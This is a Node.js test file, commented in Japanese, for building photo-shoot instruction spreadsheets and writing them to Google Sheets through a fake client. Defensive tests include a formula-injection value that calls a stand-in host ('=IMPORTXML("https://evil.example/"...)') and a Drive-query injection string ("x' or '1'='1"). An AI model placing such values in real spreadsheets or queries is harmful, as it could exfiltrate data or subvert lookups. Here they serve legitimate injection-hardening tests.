/**
 * 撮影指示書 (スプレッドシート) の中身と書き込み係の試験 (画像制作の新フロー PR-D・2026-10-09)。
 *   lib/shoot-sheet.js        … 中身を組む純粋関数 (入力 → 行)
 *   services/sheets-writer.js … Google に書く係 (偽の Google を渡して、送った要求を見る)
 * 実際の Google には繋がない。API・画面・DB の試験は apps/product-hub/scripts/smoke.mjs
 */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  buildShootSheet, shootSheetTitle, cutsFromComposeText, mentionsShoot, cutNameFrom, sectionText,
  validateCutsInput, normalizeCuts, cutsFromSlots, aiNoOfUid, shootSheetMaterialHash, shootRequestBody, shootSheetBlockReason,
  spreadsheetUrl, CUT_COLUMNS, MAX_CUTS,
} from '../apps/product-hub/lib/shoot-sheet.js';
import {
  writeSpreadsheet, formulaCell, findSpreadsheetByAppProperty, spreadsheetUsable, createSpreadsheetInFolder,
  explainGoogleError, getSheetsWriteClients,
} from '../apps/product-hub/services/sheets-writer.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
let pass = 0; let fail = 0;
const ok = (c, l, d = '') => { if (c) { pass++; console.log(`  ✓ ${l}`); } else { fail++; console.log(`  ✗ ${l}${d ? ' — ' + String(d).slice(0, 400) : ''}`); } };
const throwsAsync = async (l, fn, want) => {
  try { await fn(); fail++; console.log(`  ✗ ${l} — 例外が出なかった`); }
  catch (e) { if (!want || String(e.message).includes(want)) { pass++; console.log(`  ✓ ${l}`); } else { fail++; console.log(`  ✗ ${l} — ${e.message}`); } }
};

const FOLDER = 'https://drive.google.com/drive/folders/1AbCdEfGhIjKlMnOpQrStUvWxYz012345';
const CUT = { label: '2枚目｜使い方', cut: '使用シーン', composition: '手元を左 2/3', props: '木の匙', background: '木目の天板', tone: '湯気・温かい', ng: 'ネイルなし', role: '使い方', title: '混ぜる・振る' };

console.log('① ファイル名');
ok(shootSheetTitle('maitakep50', 'inhouse') === '撮影指示書_maitakep50（社内撮影）', '社内撮影');
ok(shootSheetTitle('maitakep50', 'photographer') === '撮影指示書_maitakep50（カメラマン撮影）', 'カメラマン撮影');
ok(shootSheetTitle('a/b:c\n', 'inhouse') === '撮影指示書_a／b_c（社内撮影）', '商品コードの / : 改行を寄せる', shootSheetTitle('a/b:c\n', 'inhouse'));

console.log('② 中身 (社内撮影)');
const inh = buildShootSheet({ productCode: 'maitakep50', productName: 'マイタケ粉末 50g', shootMode: 'inhouse', folderUrl: FOLDER, cuts: [CUT], requestText: '依頼文' });
ok(inh.title === '撮影指示書_maitakep50（社内撮影）' && inh.sheets.length === 1 && inh.sheets[0].name === '撮影指示', '社内撮影は 1 タブ「撮影指示」だけ (依頼文のタブは無い)');
ok(JSON.stringify(inh.sheets[0].rows) === JSON.stringify([
  ['撮影指示書'], ['商品名', 'マイタケ粉末 50g'], ['商品コード', 'maitakep50'], ['撮影の種類', '社内撮影'], ['画像フォルダ', FOLDER], [],
  CUT_COLUMNS, ['1', '2枚目｜使い方', '使用シーン', '手元を左 2/3', '木の匙', '木目の天板', '湯気・温かい', 'ネイルなし'],
]), '見出し (商品名・撮影の種類・画像フォルダ) + カット一覧 (カット番号・使う画像・カット名・構図・小物・背景・トーン・NG)', JSON.stringify(inh.sheets[0].rows));
ok(CUT_COLUMNS.join() === 'カット番号,使う画像,カット名,構図,小物,背景,トーン,NG', '列は設計 §3.4 の順');
const f0 = inh.sheets[0].format;
ok(f0.boldRows.includes(0) && f0.boldRows.includes(6) && f0.frozenRows === 7 && f0.columnWidths.length === 8 && f0.wrap === true,
  '書式: タイトルと表の見出しが太字・見出しまで固定・8 列の幅・折り返し', JSON.stringify(f0));
ok(inh.sheets[0].rows.flat().every((c) => typeof c === 'string'), 'セルは全部文字列 (RAW で書く)');
const empty = buildShootSheet({ productCode: 'x', productName: 'y', shootMode: 'inhouse', folderUrl: FOLDER, cuts: [] });
ok(empty.sheets[0].rows.length === 8 && /書き足してください/.test(empty.sheets[0].rows[7][2]), '要撮影のカットが無ければ、表は残して「書き足してください」の行');
let threw = false;
try { buildShootSheet({ productCode: 'x', shootMode: 'none', cuts: [] }); } catch { threw = true; }
ok(threw, '撮影不要・未判定では組まない (throw)');

console.log('③ 中身 (カメラマン撮影)');
const req = shootRequestBody({ mention: '@つくば', productName: 'マイタケ粉末 50g', sheetUrl: spreadsheetUrl('SHEET1'), folderUrl: FOLDER });
const ph = buildShootSheet({ productCode: 'maitakep50', productName: 'マイタケ粉末 50g', shootMode: 'photographer', folderUrl: FOLDER, cuts: [CUT], requestText: req });
ok(ph.sheets.length === 2 && ph.sheets[1].name === '依頼文', 'カメラマン撮影は 2 タブ目「依頼文」');
ok(ph.sheets[1].rows.map((r) => r[0]).join('\n') === req, '依頼文のタブは 1 行 1 セルで依頼文そのまま', JSON.stringify(ph.sheets[1].rows));
ok(req.split('\n')[0] === '@つくば' && req.includes('https://docs.google.com/spreadsheets/d/SHEET1/edit') && req.includes(FOLDER), '依頼文に宛先・指示書の URL・画像フォルダ');
ok(!shootRequestBody({ mention: '  ', productName: 'x', sheetUrl: 'u', folderUrl: 'f' }).startsWith('\n')
  && shootRequestBody({ mention: '', productName: 'x', sheetUrl: 'u', folderUrl: 'f' }).startsWith('お世話になっています。'), '宛先が空なら宛先の行を入れない');

console.log('④ 数式として評価させない材料');
const evil = { ...CUT, cut: '=IMPORTXML("https://evil.example/","//a")', props: '+1+1', ng: '-NG を書く', background: '@SUM(A1)' };
const ev = buildShootSheet({ productCode: '=cmd', productName: '=HYPERLINK("x","y")', shootMode: 'inhouse', folderUrl: FOLDER, cuts: [evil] });
const evRow = ev.sheets[0].rows[7];
ok(evRow[2] === evil.cut && evRow[4] === '+1+1' && evRow[7] === '-NG を書く' && evRow[5] === '@SUM(A1)' && ev.sheets[0].rows[1][1] === '=HYPERLINK("x","y")',
  '値は書き換えない (先頭に \' も付けない) — 守りは RAW で書くこと (下の書き込み係の試験で見る)', JSON.stringify(evRow));

console.log('⑤ カットの入力の検査');
ok(validateCutsInput('x').error && validateCutsInput({}).error, '配列でなければエラー');
ok(/40/.test(validateCutsInput(Array.from({ length: MAX_CUTS + 1 }, () => ({}))).error || ''), `${MAX_CUTS} 個より多ければエラー`);
ok(/文字列/.test(validateCutsInput([{ cut: 1 }]).error || '') && /形が不正/.test(validateCutsInput([null]).error || '') && /形が不正/.test(validateCutsInput([['a']]).error || ''), '欄が文字列でない・カットが object でなければエラー');
ok(/長すぎ/.test(validateCutsInput([{ ng: 'x'.repeat(2001) }]).error || ''), '長すぎる欄はエラー (黙って切らない)');
const v = validateCutsInput([{ cut: ' 粉末アップ ', extra: 'x' }, CUT]);
ok(!v.error && v.cuts.length === 2 && v.cuts[0].no === 1 && v.cuts[1].no === 2 && v.cuts[0].cut === '粉末アップ' && v.cuts[0].label === '' && !('extra' in v.cuts[0]),
  '通ったカットは番号を振り直し・欠けた欄は空・知らない欄は落とす', JSON.stringify(v));

console.log('⑥ 材料の hash (「LP構成が変わりました」)');
const base = { productCode: 'c', productName: 'n', shootMode: 'inhouse', folderUrl: FOLDER, cuts: [CUT] };
const h0 = shootSheetMaterialHash(base);
ok(h0 === shootSheetMaterialHash({ ...base, cuts: [{ ...CUT }] }) && /^[0-9a-f]{64}$/.test(h0), '同じ材料なら同じ hash');
ok(h0 === shootSheetMaterialHash({ ...base, cuts: [Object.fromEntries(Object.entries(CUT).reverse())] }), '欄の順が違っても同じ hash');
ok(h0 !== shootSheetMaterialHash({ ...base, cuts: [{ ...CUT, composition: '真上から' }] }), 'カットの中身が変われば違う hash');
ok(h0 !== shootSheetMaterialHash({ ...base, shootMode: 'photographer' }) && h0 !== shootSheetMaterialHash({ ...base, productName: 'n2' })
  && h0 !== shootSheetMaterialHash({ ...base, folderUrl: FOLDER + 'x' }) && h0 !== shootSheetMaterialHash({ ...base, cuts: [] }),
  '撮影の種類・商品名・画像フォルダ・カットの数が変わっても違う hash');

console.log('⑦ LP構成 (⑦形式) から要撮影のカットを拾う');
const fixture = fs.readFileSync(path.join(HERE, 'fixtures', 'lp-compose', 'v22-3images-hakka.md'), 'utf8');
ok(cutsFromComposeText(fixture).length === 0, '使用素材に「撮影」が無い構成 (配信元の例) からは 0 カット');
// 1枚目の使用素材を「撮影: 使用シーン」にした構成
const withShoot = fixture.replace(/(# 1枚目｜FV[\s\S]*?## 使用素材\n)提供された実物商品画像/, '$1撮影: 使用シーン・提供された実物商品画像');
ok(withShoot !== fixture, '(前提) 1枚目の使用素材を書き換えられた');
const cuts = cutsFromComposeText(withShoot);
ok(cuts.length === 1, '使用素材に「撮影」が出てくる画像だけ要撮影', JSON.stringify(cuts));
const c1 = cuts[0] || {};
ok(c1.no === 1 && c1.label === '1枚目｜FV' && c1.cut === '使用シーン', 'カット番号・使う画像 (N枚目｜画像名)・カット名 (「撮影:」の後ろ)', JSON.stringify(c1));
ok(c1.composition.startsWith('提供された実物商品画像を中央やや右') && c1.props === '最小限。' && c1.background.startsWith('明るい背景')
  && c1.tone.startsWith('#FAF9F6') && c1.ng.startsWith('商品形状・ラベル') && c1.title === '夏のベタつく空気に、ひと吹き。' && c1.role === 'FV／商品理解',
  '構図=商品配置 / 小物=装飾・演出 / 背景=背景・シーン / トーン=使用カラー / NG=NG事項 / 見出し / 役割 を拾う', JSON.stringify(c1));
// 撮影不要・撮影済み は要らない側
const notNeeded = fixture.replace(/(# 1枚目｜FV[\s\S]*?## 使用素材\n)提供された実物商品画像/, '$1撮影不要 (撮影済みの写真を使う)');
ok(cutsFromComposeText(notNeeded).length === 0, '「撮影不要」「撮影済み」だけなら要撮影にしない');
// B・C の形の見出し (## 構図 / ## 小物 / ## トーン) があればそちらを優先
const bcBlock = '# 0枚目｜サムネイル\n## 使用素材\n撮影（粉末アップ）\n## 構図\n真上から\n## 小物\n豆皿\n## 背景・シーン\n白\n## トーン\n柔らかい影\n## NG\n黄色く見せない\n### 補足\n小見出しは中身に含む\n## 商品配置\n中央';
const bc = cutsFromComposeText(bcBlock)[0] || {};
ok(bc.cut === '粉末アップ' && bc.composition === '真上から' && bc.props === '豆皿' && bc.tone === '柔らかい影' && bc.ng.startsWith('黄色く見せない') && bc.ng.includes('小見出しは中身に含む'),
  '「## 構図」「## 小物」「## トーン」の見出しがあればそれを使う (### 以下は中身)', JSON.stringify(bc));
ok(cutsFromComposeText('').length === 0 && cutsFromComposeText(null).length === 0 && cutsFromComposeText('ただの文章 撮影').length === 0, '構成が無い・読めなければ 0 カット');
ok(mentionsShoot('撮影: x') && !mentionsShoot('撮影不要') && !mentionsShoot('撮影済み') && mentionsShoot('撮影済み・追加で撮影'), '撮影の語の見方');
ok(cutNameFrom('撮影: 使用シーン・素材2') === '使用シーン' && cutNameFrom('撮影（粉末アップ）') === '粉末アップ' && cutNameFrom('撮影：料理') === '料理', 'カット名を取れる (区切りの前まで)');
ok(cutNameFrom('撮影する') === null, '名前が書いていなければ null (画像名で埋める)');
ok(sectionText('## A\nx\n## B\ny', /^B$/) === 'y' && sectionText('## A\nx', /^Z$/) === '', '見出しの中身 (無ければ空)');

console.log('⑦-2 B の並び (編集版の要撮影) と C の判定 (AI の撮影指示) を合わせる');
{
  const blk = (mat, extra = '') => ['## 画像の役割', '特長', '## メイン見出し', '見出し', '## 商品配置', 'ブロックの構図', '## 使用素材', mat, '## NG事項', 'ブロックのNG', extra].join('\n').split('\n');
  const ai = [
    { no: 0, needs_shoot: false, cut: '', composition: '', props: '', background: '', tone: '', ng: '' },
    { no: 1, needs_shoot: false, cut: '', composition: '', props: '', background: '', tone: '', ng: '' },
    { no: 2, needs_shoot: true, cut: 'AIカット2', composition: 'AI構図2', props: 'AI小物2', background: 'AI背景2', tone: 'AIトーン2', ng: 'AI NG2' },
  ];
  const slotsAi = [
    { uid: 'a0', no: 0, name: 'サムネイル', role: 'TOP', title: '', lines: blk('提供された実物商品画像') },
    { uid: 'a1', no: 1, name: 'FV', role: 'FV', title: 'FVの見出し', lines: blk('撮影: 手元') },
    { uid: 'a2', no: 2, name: '成分', role: '特長', title: '成分の見出し', lines: blk('提供された実物商品画像') },
  ];
  ok(aiNoOfUid('a2') === 2 && aiNoOfUid('nAbc') === null && aiNoOfUid('e3x1') === null && aiNoOfUid('a') === null, 'uid から AI の構成での番号 (a<番号> だけ)');
  const c0 = cutsFromSlots({ slots: slotsAi, hasEditShoot: false, aiImages: null });
  ok(c0.length === 1 && c0[0].label === '1枚目｜FV' && c0[0].cut === '手元' && c0[0].composition === 'ブロックの構図' && c0[0].title === 'FVの見出し',
    '編集版も AI の判定も無い: 使用素材の「撮影」で推定し、中身はブロックから', JSON.stringify(c0));
  const c1 = cutsFromSlots({ slots: slotsAi, hasEditShoot: false, aiImages: ai });
  ok(c1.length === 1 && c1[0].label === '2枚目｜成分' && c1[0].cut === 'AIカット2' && c1[0].composition === 'AI構図2' && c1[0].props === 'AI小物2'
    && c1[0].background === 'AI背景2' && c1[0].tone === 'AIトーン2' && c1[0].ng === 'AI NG2' && c1[0].role === '特長' && c1[0].title === '成分の見出し',
  'AI の判定があれば要撮影は needs_shoot (使用素材の推定より優先)・中身 6 項目は AI・役割と見出しは構成', JSON.stringify(c1));
  // 編集版: 足した画像 (nNew) を 2枚目に入れて、AI の 2枚目 (a2) を 3枚目に。要撮影は人の値
  const slotsEdit = [
    { ...slotsAi[0], shoot: false }, { ...slotsAi[1], shoot: false },
    { uid: 'nNew', no: 2, name: '使い方', role: '使い方', title: '足した見出し', lines: blk('提供された実物商品画像'), shoot: true },
    { ...slotsAi[2], no: 3, shoot: true },
  ];
  const c2 = cutsFromSlots({ slots: slotsEdit, hasEditShoot: true, aiImages: ai });
  ok(c2.length === 2 && c2[0].label === '2枚目｜使い方' && c2[0].cut === '使い方' && c2[0].composition === 'ブロックの構図' && c2[0].title === '足した見出し',
    '🚨 足した画像 (AI の判定なし) はブロックから拾う — 今の番号 2 で AI の 2枚目の中身を付けない', JSON.stringify(c2[0]));
  ok(c2[1].label === '3枚目｜成分' && c2[1].cut === 'AIカット2' && c2[1].no === 2, '🚨 並べ替えた画像は元の画像 (uid a2) で AI の判定を引く (今の番号 3)', JSON.stringify(c2[1]));
  const c3 = cutsFromSlots({ slots: slotsEdit.map((x) => ({ ...x, shoot: x.uid === 'a1' })), hasEditShoot: true, aiImages: ai });
  ok(c3.length === 1 && c3[0].label === '1枚目｜FV' && c3[0].cut === '手元', '人が要撮影にした画像 (AI は不要と判定) はブロックから拾う・AI が要るとした画像も人が外せば出ない', JSON.stringify(c3));
}

console.log('⑧ 作れない理由');
ok(/社内撮影/.test(shootSheetBlockReason({ shootMode: 'none', folderId: 'F', configured: true }) || '')
  && /社内撮影/.test(shootSheetBlockReason({ shootMode: null, folderId: 'F', configured: true }) || ''), '撮影不要・未判定');
ok(/画像フォルダ/.test(shootSheetBlockReason({ shootMode: 'inhouse', folderId: null, configured: true }) || ''), '画像フォルダが無い');
ok(/GOOGLE_SERVICE_ACCOUNT_KEY/.test(shootSheetBlockReason({ shootMode: 'photographer', folderId: 'F', configured: false }) || ''), 'サービスアカウントが未設定');
ok(shootSheetBlockReason({ shootMode: 'inhouse', folderId: 'F', configured: true }) === null, '揃えば null');

console.log('⑨ 書き込み係 (偽の Google)');
// tabs = [{ title, owned }]。送った要求を記録するだけ (適用の正しさは smoke の偽物が見る)
function fakeSheets(initialTabs, { failBatch = false } = {}) {
  const calls = [];
  const tabs = initialTabs.map((t, i) => ({ sheetId: i, title: t.title, owned: !!t.owned }));
  const sheets = { spreadsheets: {
    get: async (p) => { calls.push(['get', p]); return { data: { sheets: tabs.map((t) => ({ properties: { sheetId: t.sheetId, title: t.title, gridProperties: { rowCount: 5, columnCount: 3 } },
      developerMetadata: t.owned ? [{ metadataKey: 'phOwnedTab', metadataValue: t.title }] : [] })) } }; },
    batchUpdate: async (p) => { calls.push(['batchUpdate', p]); if (failBatch) throw Object.assign(new Error('Backend Error'), { code: 500 }); return { data: { replies: [] } }; },
    values: {
      batchClear: async (p) => { calls.push(['batchClear', p]); return {}; },
      batchUpdate: async (p) => { calls.push(['valuesBatchUpdate', p]); return {}; },
    },
  } };
  let name = '無題のスプレッドシート';
  const drive = { files: {
    get: async (p) => { calls.push(['driveGet', p]); return { data: { name } }; },
    update: async (p) => { calls.push(['driveUpdate', p]); name = p.requestBody.name; return { data: {} }; },
  } };
  const reqs = () => calls.filter((c) => c[0] === 'batchUpdate').flatMap((c) => c[1].requestBody.requests);
  return { sheets, drive, calls, reqs, nameOf: () => name };
}
{
  const g = fakeSheets([{ title: 'シート1' }]);
  await writeSpreadsheet(g, { spreadsheetId: 'S1', title: ph.title, tabs: ph.sheets, fresh: true });
  const rq = g.reqs();
  ok(g.calls.filter((c) => c[0] === 'batchUpdate').length === 1 && !g.calls.some((c) => c[0] === 'batchClear' || c[0] === 'valuesBatchUpdate'),
    '🚨 タブの足し引き・値の消去と書き込み・書式は batchUpdate 1 回 (途中で失敗して空の指示書を残さない)', JSON.stringify(g.calls.map((c) => c[0])));
  const adds = rq.filter((r) => r.addSheet).map((r) => r.addSheet.properties);
  ok(adds.map((p) => p.title).join() === '撮影指示,依頼文' && adds.every((p) => Number.isInteger(p.sheetId) && p.sheetId > 0) && new Set(adds.map((p) => p.sheetId)).size === 2,
    '作ったばかり: 「撮影指示」「依頼文」を足す (sheetId をこちらで決めて、同じ要求の中で書く)', JSON.stringify(adds));
  ok(rq.filter((r) => r.createDeveloperMetadata).map((r) => r.createDeveloperMetadata.developerMetadata).every((m) => m.metadataKey === 'phOwnedTab' && adds.some((p) => p.sheetId === m.location.sheetId))
    && rq.filter((r) => r.createDeveloperMetadata).length === 2, '足したタブに印 (developer metadata) を付ける');
  ok(rq.some((r) => r.deleteSheet && r.deleteSheet.sheetId === 0) && rq.findIndex((r) => r.deleteSheet) > rq.findIndex((r) => r.addSheet) && rq.findIndex((r) => r.deleteSheet) === rq.length - 1,
    '作ったばかりなら最初からある「シート1」を、足した後 (最後) に消す');
  const mainId = adds[0].sheetId;
  const writes = rq.filter((r) => r.updateCells && r.updateCells.rows);
  const cells = writes.flatMap((w) => w.updateCells.rows.flatMap((row) => row.values));
  ok(cells.length > 0 && cells.every((c) => Object.keys(c.userEnteredValue).join() === 'stringValue'), '🚨 値は stringValue だけ (数式・数値として評価させない)');
  ok(writes[0].updateCells.start.sheetId === mainId && writes[0].updateCells.start.rowIndex === 0 && writes[0].updateCells.rows.map((r) => r.values.map((c) => c.userEnteredValue.stringValue)).join('|') === ph.sheets[0].rows.join('|'),
    'タブごとに A1 から全行を書く');
  const clearIdx = rq.findIndex((r) => r.updateCells && r.updateCells.range && r.updateCells.range.sheetId === mainId && /userEnteredValue/.test(r.updateCells.fields));
  ok(clearIdx >= 0 && clearIdx < rq.indexOf(writes[0]), '書く前にタブの中身を消す (前の版の行が残らない)');
  ok(rq.some((r) => r.updateSheetProperties && r.updateSheetProperties.properties.sheetId === mainId && r.updateSheetProperties.properties.gridProperties.frozenRowCount === 7), '書式: 撮影指示のタブは 7 行目まで固定');
  ok(rq.some((r) => r.repeatCell && r.repeatCell.range.sheetId === mainId && r.repeatCell.range.startRowIndex === 6 && r.repeatCell.cell.userEnteredFormat.textFormat?.bold === true), '書式: 表の見出し行を太字');
  ok(rq.filter((r) => r.updateDimensionProperties && r.updateDimensionProperties.range.sheetId === mainId).length === 8, '書式: 8 列の幅');
  ok(g.nameOf() === ph.title, 'ファイル名が違えば付け直す');
}
{
  const g = fakeSheets([{ title: '撮影指示', owned: true }, { title: '依頼文', owned: true }, { title: '人のメモ' }]);
  await writeSpreadsheet(g, { spreadsheetId: 'S1', title: inh.title, tabs: inh.sheets, removeTabs: ['依頼文'] });
  const rq = g.reqs();
  ok(rq.filter((r) => r.deleteSheet).map((r) => r.deleteSheet.sheetId).join() === '1', '更新: 要らなくなった自分のタブ (印のある依頼文) だけ消し、人が足したタブは残す');
  ok(!rq.some((r) => r.addSheet), '更新: あるタブは足さない');
  ok(rq.filter((r) => r.updateCells).every((r) => (r.updateCells.range || r.updateCells.start).sheetId === 0), '更新: 書くのは自分のタブだけ (人のメモには触らない)');
  ok(rq.some((r) => r.appendDimension && r.appendDimension.dimension === 'ROWS') && rq.some((r) => r.appendDimension && r.appendDimension.dimension === 'COLUMNS'),
    '行・列が足りなければ広げる (人が行を消していても書ける)');
  const g2 = fakeSheets([{ title: '撮影指示', owned: true }, { title: '依頼文' }]);
  await writeSpreadsheet(g2, { spreadsheetId: 'S1', title: inh.title, tabs: inh.sheets, removeTabs: ['依頼文'] });
  ok(!g2.reqs().some((r) => r.deleteSheet), '🚨 同じ名前でも印の無いタブ (人が作った「依頼文」) は消さない');
  const g3 = fakeSheets([{ title: '撮影指示' }]);
  await throwsAsync('🚨 書くタブと同じ名前の、人が作ったタブ (印なし) があれば止める (上書きしない)', () => writeSpreadsheet(g3, { spreadsheetId: 'S1', tabs: inh.sheets }), '人が作った');
  ok(!g3.calls.some((c) => c[0] === 'batchUpdate'), '止めたときは何も送らない');
  const g8 = fakeSheets([{ title: 'シート1' }, { title: '撮影指示' }]);
  await throwsAsync('🚨 作ったばかりのファイルでも、人が作った同じ名前のタブ (印なし) があれば止める', () => writeSpreadsheet(g8, { spreadsheetId: 'S1', tabs: inh.sheets, fresh: true }), '人が作った');
  const g5 = fakeSheets([{ title: 'シート1' }, { title: '人のメモ' }]);
  await writeSpreadsheet(g5, { spreadsheetId: 'S1', tabs: inh.sheets, fresh: true });
  ok(g5.reqs().filter((r) => r.deleteSheet).map((r) => r.deleteSheet.sheetId).join() === '0', '作ったばかりでも消すのは最初の「シート1」(sheetId 0) だけ (人がすぐ足したタブは残す)');
  const g6 = fakeSheets([{ title: '撮影指示', owned: true }]);
  await throwsAsync('送る直前の確認 (beforeWrite) が断れば throw', () => writeSpreadsheet(g6, { spreadsheetId: 'S1', tabs: inh.sheets, beforeWrite: () => { throw new Error('変わった'); } }), '変わった');
  ok(g6.calls.some((c) => c[0] === 'get') && !g6.calls.some((c) => c[0] === 'batchUpdate'), '🚨 送る直前の確認はタブを読んだ後に呼び、断ったら batchUpdate を送らない');
  const g7 = fakeSheets([{ title: '撮影指示', owned: true }, { title: '人のメモ' }]);
  let seen = null;
  await writeSpreadsheet(g7, { spreadsheetId: 'S1', tabs: inh.sheets, beforeWrite: (ctx) => { seen = ctx; } });
  ok(JSON.stringify(seen && seen.existing.map((t) => [t.title, t.owned])) === '[["撮影指示",true],["人のメモ",false]]', '送る直前の確認には、今あるタブと印の有無を渡す (拾い直したファイルに指示書があるかを呼び手が見る)', JSON.stringify(seen));
  // PR-F (デザイナー修正依頼書) 向け: 呼び手が組んだ式だけ式のセル・行の高さ
  const g9 = fakeSheets([{ title: 'シート1' }]);
  await writeSpreadsheet(g9, { spreadsheetId: 'S1', fresh: true, tabs: [{ name: '修正依頼', rows: [['画像', '修正指示'], [formulaCell('=IMAGE("https://drive.google.com/thumbnail?id=abc")'), '=人の入力']], format: { rowHeights: [{ start: 1, end: 2, px: 200 }] } }] });
  const w9 = g9.reqs().filter((r) => r.updateCells && r.updateCells.rows)[0].updateCells.rows;
  ok(w9[1].values[0].userEnteredValue.formulaValue === '=IMAGE("https://drive.google.com/thumbnail?id=abc")' && w9[1].values[1].userEnteredValue.stringValue === '=人の入力' && !('formulaValue' in w9[1].values[1].userEnteredValue),
    '式のセルは formulaCell() で渡したものだけ (= で始まる普通の文字は文字のまま)', JSON.stringify(w9));
  ok(g9.reqs().some((r) => r.updateDimensionProperties && r.updateDimensionProperties.range.dimension === 'ROWS' && r.updateDimensionProperties.range.startIndex === 1 && r.updateDimensionProperties.properties.pixelSize === 200), '行の高さを指定できる');
  let threwF = false; try { formulaCell('IMAGE(x)'); } catch { threwF = true; }
  ok(threwF, '式は = で始まるものだけ');
  const g4 = fakeSheets([{ title: '撮影指示', owned: true }], { failBatch: true });
  await throwsAsync('batchUpdate が失敗したら throw (呼び手が URL を書かない)', () => writeSpreadsheet(g4, { spreadsheetId: 'S1', title: 'x', tabs: inh.sheets }), 'Backend');
  ok(!g4.calls.some((c) => c[0] === 'driveUpdate'), '失敗したら名前も付け直さない');
}
{
  const listed = [];
  const drive = { files: {
    list: async (p) => { listed.push(p); return { data: { files: [{ id: 'FOUND1' }] } }; },
    create: async (p) => { listed.push(p); return { data: { id: 'NEW1' } }; },
    get: async (p) => {
      if (p.fileId === 'GONE00') throw Object.assign(new Error('File not found'), { code: 404 });
      if (p.fileId === 'BOOM00') throw Object.assign(new Error('Backend Error'), { code: 500 });
      return { data: { TRASH0: { trashed: true }, MOVED0: { parents: ['OTHERF'] }, GOOD00: { parents: ['FOLDER1'], mimeType: 'application/vnd.google-apps.spreadsheet' } }[p.fileId] };
    },
  } };
  const f = await findSpreadsheetByAppProperty({ drive }, { folderId: 'FOLDER1', key: 'phShootSheetDraft', value: '12' });
  ok(f?.id === 'FOUND1' && listed[0].q.includes("appProperties has { key='phShootSheetDraft' and value='12' }") && listed[0].q.includes("'FOLDER1' in parents")
    && listed[0].q.includes('trashed = false') && listed[0].supportsAllDrives === true, '前に作ったファイルを appProperties で探す (名前では探さない・共有ドライブ)', listed[0].q);
  await throwsAsync('フォルダ ID にクエリを壊す文字があれば探さない', () => findSpreadsheetByAppProperty({ drive }, { folderId: "x' or '1'='1", key: 'k', value: '1' }), 'フォルダ');
  await throwsAsync('appProperties の値にクエリを壊す文字があれば探さない', () => findSpreadsheetByAppProperty({ drive }, { folderId: 'FOLDER1', key: 'k', value: "1' or" }), 'appProperties');
  const c = await createSpreadsheetInFolder({ drive }, { folderId: 'FOLDER1', title: 'T', appProperties: { phShootSheetDraft: '12' } });
  const cp = listed[listed.length - 1];
  ok(c.id === 'NEW1' && cp.requestBody.mimeType === 'application/vnd.google-apps.spreadsheet' && cp.requestBody.parents[0] === 'FOLDER1'
    && cp.requestBody.appProperties.phShootSheetDraft === '12' && cp.supportsAllDrives === true && !('permissions' in cp.requestBody),
  'フォルダの中にスプレッドシートを作る (印の appProperties 付き・リンク共有は付けない)', JSON.stringify(cp));
  ok((await spreadsheetUsable({ drive }, { fileId: 'GONE00', folderId: 'FOLDER1' })).usable === false, '消されたファイル (404) は使えない → 作り直す');
  ok((await spreadsheetUsable({ drive }, { fileId: 'TRASH0', folderId: 'FOLDER1' })).reason === 'trashed', 'ごみ箱のファイルは使えない');
  ok((await spreadsheetUsable({ drive }, { fileId: 'MOVED0', folderId: 'FOLDER1' })).reason === 'moved', '別のフォルダに移ったファイルは使えない (今の画像フォルダに作る)');
  ok((await spreadsheetUsable({ drive }, { fileId: 'GOOD00', folderId: 'FOLDER1' })).usable === true, '同じフォルダのファイルは使う');
  await throwsAsync('404 以外の失敗 (権限・障害) は作り直さずに失敗にする', () => spreadsheetUsable({ drive }, { fileId: 'BOOM00', folderId: 'FOLDER1' }), 'Backend');
}

console.log('⑩ 失敗の理由 (画面に出す文)');
ok(/コンテンツ管理者/.test(explainGoogleError(Object.assign(new Error('The caller does not have permission'), { code: 403 }))), '403 → サービスアカウントを共有ドライブに「コンテンツ管理者」以上で');
ok(/Sheets API/.test(explainGoogleError(Object.assign(new Error('Google Sheets API has not been used in project 123 before or it is disabled'), { code: 403 }))), 'API が無効 → Google Cloud で有効に');
ok(/見つかりません/.test(explainGoogleError(Object.assign(new Error('File not found'), { code: 404 }))), '404 → フォルダ・ファイルが見つからない');
ok(/繋がりませんでした/.test(explainGoogleError(new Error('timeout of 20000ms exceeded'))), '時間切れ');
ok(explainGoogleError(new Error('x'.repeat(1000))).length < 400, '長い失敗の文は切る');
ok(getSheetsWriteClients({}) === null, 'env が無ければクライアントは null (fail-closed)');

console.log(`\n${fail ? '❌' : '✅'} ${pass} 件成功 / ${fail} 件失敗`);
process.exit(fail ? 1 : 0);
